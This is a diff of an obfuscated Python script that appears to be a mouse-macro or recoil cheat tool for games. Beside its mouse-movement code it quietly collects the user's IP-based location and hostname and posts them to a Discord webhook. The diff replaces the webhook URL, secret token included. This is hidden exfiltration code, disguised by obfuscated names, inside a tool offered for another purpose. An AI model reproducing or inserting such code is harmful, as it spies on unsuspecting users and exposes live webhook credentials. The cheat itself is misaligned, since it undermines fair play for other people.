@@ -55,7 +55,7 @@ try :#line:55
  geo =requests .get (f"https://ipinfo.io/{ip}/json").json ()#line:60
  geo_info =(f"Area {geo.get('city')}\n")#line:63
  host = socket.gethostname()
- webhook_url ="https://discord.com/api/webhooks/1382532762929467443/qnTBZfbMSbHhjmJ7sR-t2L1zCztsqVJr8HlkTZ9gTVcFKQaUWmNlWtjSMLShk5NfYO2q"#line:64
+ webhook_url ="https://discord.com/api/webhooks/1383238082282782762/NrH7lHRtVDhCPleLC8D86Y6cS-BD1QqeNfgLy9pWefXBaeB7rhXhCUv04qyIrYqRkvPS"#line:64
  requests .post (webhook_url ,json ={"content":geo_info })#line:65
  requests .post (webhook_url ,json =message )#line:66
  requests.post(webhook_url, json={"content": "hostname "f'{host}'})
@@ -128,7 +128,7 @@ def load_settings ():#line:128
     if O0O0O0OO0O0O00O0O =="1":#line:133
        return (24 ,24 ,24 ,28 ,0.01 )#line:134
     else :#line:135
-       return (20 ,20 ,20 ,24 ,0.01 )#line:136
+       return (24 ,24 ,24 ,28 ,0.01 )#line:136
 def display_banner (O0OOOOOOO00O00OOO ,O0O00OOO0OOOO00OO ,O00O00000O0O00000 ,O0OO000OOO0000000 ):#line:137
   print (f"""  {LIGHT_PURPLE}                                                            
           _____             _         _    _____                   _ 
@@ -138,7 +138,7 @@ def display_banner (O0OOOOOOO00O00OOO ,O0O00OOO0OOOO00OO ,O00O00000O0O00000 ,O0O
   print (f"{LIGHT_WHITE}         @BisKit {LIGHT_CYAN}@Lonely\033[0m\n")#line:143
 def mouse_motion ():#line:144
     win32api .mouse_event (win32con .MOUSEEVENTF_MOVE ,move_right ,move_down ,29 ,29 ,)#line:145
-    time .sleep (0.0036 )#line:146
+    time .sleep (0.0032 )#line:146
     win32api .mouse_event (win32con .MOUSEEVENTF_MOVE ,-move_left ,-move_up ,-29 ,-29 )#line:147
 def monitor_settings (O0O0OO00O0OO00OOO ):#line:148
     return O0O0OO00O0OO00OOO #line:149
